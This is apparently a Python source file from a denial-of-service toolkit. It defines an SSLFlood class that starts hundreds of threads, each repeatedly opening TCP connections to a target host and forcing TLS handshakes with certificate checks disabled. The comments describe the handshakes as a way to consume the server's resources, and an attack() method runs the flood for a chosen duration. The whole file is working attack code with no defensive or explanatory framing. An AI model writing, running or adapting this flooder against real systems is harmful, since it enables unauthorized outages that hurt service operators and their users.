import socket
import ssl
import threading
import time
from urllib.parse import urlparse

class SSLFlood:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or 443
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.host, self.port))
                
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                # Force SSL handshake (resource intensive)
                ssl_sock = ctx.wrap_socket(s, server_hostname=self.host)
                
                # Renegotiate to consume more resources
                try:
                    ssl_sock.do_handshake()
                except:
                    pass
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(1024)  # Approx handshake size
                
                ssl_sock.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
